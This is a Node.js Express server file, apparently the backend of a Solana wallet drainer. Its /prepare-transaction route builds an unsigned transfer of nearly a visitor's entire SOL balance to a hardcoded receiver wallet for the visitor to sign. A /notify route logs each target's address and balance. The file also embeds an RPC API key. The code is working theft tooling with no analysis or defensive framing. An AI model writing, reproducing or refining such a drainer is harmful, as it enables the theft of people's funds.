const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
const connection = new Connection(HELIUS_RPC, 'confirmed');

app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey, receiverWallet } = req.body;
        console.log('Preparing tx for:', publicKey);
        
        const fromPubkey = new PublicKey(publicKey);
        const toPubkey = new PublicKey(receiverWallet);
        
        const balance = await connection.getBalance(fromPubkey);
        console.log('Balance:', balance / LAMPORTS_PER_SOL, 'SOL');
        
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
        const amountToSend = Math.max(0, balance - minBalance - 5000 - 5000000);
        
        if (amountToSend <= 0) {
            return res.json({ success: false, error: 'No SOL available after fees' });
        }
        
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        const serialized = transaction.serialize({ requireAllSignatures: false, verifySignatures: false });
        
        res.json({ success: true, transaction: Array.from(serialized), amount: amountToSend });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/notify', async (req, res) => {
    console.log('Notification:', req.body.customMessage);
    console.log('Address:', req.body.address);
    console.log('Balance:', req.body.balance);
    res.json({ ok: true });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server on ${PORT}`));
